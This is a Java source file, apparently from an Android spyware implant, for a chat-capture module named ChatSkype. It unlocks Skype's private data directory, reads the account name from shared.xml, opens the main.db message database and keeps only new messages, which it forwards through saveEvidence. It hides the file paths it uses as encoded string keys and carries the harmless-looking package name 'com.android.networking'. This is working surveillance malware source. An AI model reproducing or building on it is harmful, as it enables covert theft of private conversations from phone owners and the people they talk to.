package com.android.networking.module.chat;

import java.io.File;
import java.io.IOException;
import java.util.ArrayList;
import java.util.Date;
import java.util.Hashtable;
import java.util.concurrent.Semaphore;

import javax.xml.parsers.DocumentBuilder;
import javax.xml.parsers.DocumentBuilderFactory;

import org.w3c.dom.Document;
import org.w3c.dom.Node;
import org.w3c.dom.NodeList;

import com.android.networking.Messages;
import com.android.networking.auto.Cfg;
import com.android.networking.db.GenericSqliteHelper;
import com.android.networking.file.Path;
import com.android.networking.util.Check;

public class ChatSkype extends SubModuleChat {
	private static final String TAG = "ChatSkype";

	private static final int PROGRAM_SKYPE = 0x01;
	String pObserving = "skype";

	private Date lastTimestamp;

	private Hashtable<String, Long> lastSkype;
	Semaphore readChatSemaphore = new Semaphore(1, true);

	@Override
	public int getProgramId() {
		return PROGRAM_SKYPE;
	}

	@Override
	String getObservingProgram() {
		return pObserving;
	}

	@Override
	void notifyStopProgram() {
		try {
			readSkypeMessageHistory();
		} catch (IOException e) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (notifyStopProgram) Error: " + e);
			}
		}
	}

	@Override
	protected void start() {
		lastSkype = markup.unserialize(new Hashtable<String, Long>());
		try {
			readSkypeMessageHistory();
		} catch (IOException e) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (notifyStopProgram) Error: " + e);
			}
		}

		if (Cfg.DEBUG) {
			Check.log(TAG + " (start), read lastSkype: " + lastSkype);
		}
	}

	@Override
	protected void stop() {
		if (Cfg.DEBUG) {
			Check.log(TAG + " (stop), ");
		}
	}

	private void readSkypeMessageHistory() throws IOException {
		if (Cfg.DEBUG) {
			Check.log(TAG + " (readChatMessages)");
		}

		if (!readChatSemaphore.tryAcquire()) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (readSkypeMessageHistory), semaphore red");
			}
			return;
		}
		try {
			boolean updateMarkup = false;

			// k_0=/data/data/com.skype.raider/files
			String dbDir = Messages.getString("k_0");
			Path.unprotect(dbDir, true);

			String account = readAccount();
			if (account.length() == 0)
				return;

			// k_1=/main.db
			String dbFile = dbDir + "/" + account + Messages.getString("k_1");

			Path.unprotect(dbDir + "/" + account, true);
			Path.unprotect(dbFile, true);
			Path.unprotect(dbFile + "-journal", true);

			File file = new File(dbFile);

			if (file.canRead()) {
				if (Cfg.DEBUG) {
					Check.log(TAG + " (readSkypeMessageHistory): can read DB");
				}

				SkypeVisitor visitor = new SkypeVisitor(this, account);
				GenericSqliteHelper helper = GenericSqliteHelper.open(dbFile);

				long lastId = lastSkype.containsKey(account) ? lastSkype.get(account) : 0;
				if (Cfg.DEBUG) {
					Check.log(TAG + " (readSkypeMessageHistory), account: " + account + " lastId: " + lastId);
				}
				visitor.lastId = lastId;

				// f_a=messages
				// Messages.getString("i_2")
				long newLastId = helper.traverseRecords(Messages.getString("f_a"), visitor);

				if (newLastId > lastId) {
					updateMarkupSkype(account, newLastId, true);
				}
			} else {
				if (Cfg.DEBUG) {
					Check.log(TAG + " (readSkypeMessageHistory) Error, file not readable: " + dbFile);
				}
			}
		} finally {
			readChatSemaphore.release();
		}
	}

	private String readAccount() throws IOException {

		// k_0=/data/data/com.skype.raider/files
		String dbDir = Messages.getString("k_0");

		// k_2=/shared.xml
		String confFile = dbDir + Messages.getString("k_2");

		Path.unprotect(confFile, true);

		DocumentBuilder builder;
		String account = null;
		try {
			builder = DocumentBuilderFactory.newInstance().newDocumentBuilder();
			Document doc = builder.parse(new File(confFile));
			NodeList defaults = doc.getElementsByTagName("Default");
			for (int i = 0; i < defaults.getLength(); i++) {
				Node d = defaults.item(i);
				Node p = d.getParentNode();
				if ("Account".equals(p.getNodeName())) {
					account = d.getFirstChild().getNodeValue();
					break;
				}
			}

		} catch (Exception e) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (readAccount) Error: " + e);
			}
		}
		return account;
	}

	private void updateMarkupSkype(String account, long newLastId, boolean serialize) {
		if (Cfg.DEBUG) {
			Check.log(TAG + " (updateMarkupSkype), mailStore: " + account + " +lastId: " + newLastId);
		}

		lastSkype.put(account, newLastId);
		try {
			if (serialize || (newLastId % 10 == 0)) {
				if (Cfg.DEBUG) {
					Check.log(TAG + " (updateMarkupSkype), write lastId: " + newLastId);
				}
				markup.writeMarkupSerializable(lastSkype);
			}
		} catch (IOException e) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (updateMarkupSkype) Error: " + e);
			}
		}
	}

	public void saveEvidence(ArrayList<MessageChat> messages) {
		getModule().saveEvidence(messages);
	}

}
